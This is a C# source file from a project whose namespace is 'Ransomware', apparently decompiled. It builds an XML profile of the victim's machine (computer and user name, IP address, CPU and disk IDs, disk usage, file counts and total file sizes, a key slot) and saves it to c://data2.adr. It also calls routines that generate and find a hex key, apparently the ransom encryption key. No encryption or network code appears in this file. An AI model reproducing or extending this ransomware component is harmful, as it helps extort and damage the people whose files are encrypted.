using System;
using System.Xml;

namespace Ransomware;

public class XmlFile
{
	public void CreateXmlFile()
	{
		XmlDocument xmlDocument = new XmlDocument();
		XmlNode newChild = xmlDocument.CreateXmlDeclaration("1.0", "utf-8", "");
		xmlDocument.AppendChild(newChild);
		Computer computer = new Computer();
		XmlNode xmlNode = xmlDocument.CreateElement("Users");
		xmlDocument.AppendChild(xmlNode);
		XmlNode xmlNode2 = xmlDocument.CreateNode(XmlNodeType.Element, "User", null);
		CreateNode(xmlDocument, xmlNode2, "PcName", computer.GetComputerName());
		CreateNode(xmlDocument, xmlNode2, "Memory", computer.GetTotalPhysicalMemory());
		CreateNode(xmlDocument, xmlNode2, "PcType", computer.GetSystemType());
		CreateNode(xmlDocument, xmlNode2, "UserName", computer.GetUserName());
		CreateNode(xmlDocument, xmlNode2, "IpAddress", computer.GetIPAddress());
		CreateNode(xmlDocument, xmlNode2, "CpuId", computer.GetCpuID());
		CreateNode(xmlDocument, xmlNode2, "DiskId", computer.GetDiskID());
		CreateNode(xmlDocument, xmlNode2, "TotalDiskSize", computer.GetTotalDiskSize());
		CreateNode(xmlDocument, xmlNode2, "TotalFreeSpace", computer.GetTotalFreeSpace());
		CreateNode(xmlDocument, xmlNode2, "HexKey", "");
		CreateNode(xmlDocument, xmlNode2, "AllFileNumber", computer.GetAllFileNumber());
		CreateNode(xmlDocument, xmlNode2, "AllFileSize", computer.GetAllFileSize());
		CreateNode(xmlDocument, xmlNode2, "RunTime", computer.GetRunTime());
		xmlNode.AppendChild(xmlNode2);
		try
		{
			xmlDocument.Save("c://data2.adr");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void CreateNode(XmlDocument xmlDoc, XmlNode parentNode, string name, string value)
	{
		XmlNode xmlNode = xmlDoc.CreateNode(XmlNodeType.Element, name, null);
		xmlNode.InnerText = value;
		parentNode.AppendChild(xmlNode);
	}

	public string FindHexKey()
	{
		Computer computer = new Computer();
		return computer.FindHexKey();
	}

	public string GenHexKey()
	{
		Computer computer = new Computer();
		computer.GenHexKey();
		return computer.GenHexKey();
	}
}
